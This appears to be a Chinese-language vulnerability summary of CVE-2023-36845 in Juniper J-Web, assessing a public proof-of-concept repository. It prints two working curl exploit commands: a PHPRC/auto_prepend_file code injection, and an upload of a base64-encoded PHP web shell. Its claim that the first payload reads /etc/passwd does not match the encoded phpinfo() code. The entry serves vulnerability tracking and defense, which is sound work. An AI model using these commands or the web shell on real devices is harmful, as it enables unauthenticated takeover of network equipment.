## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)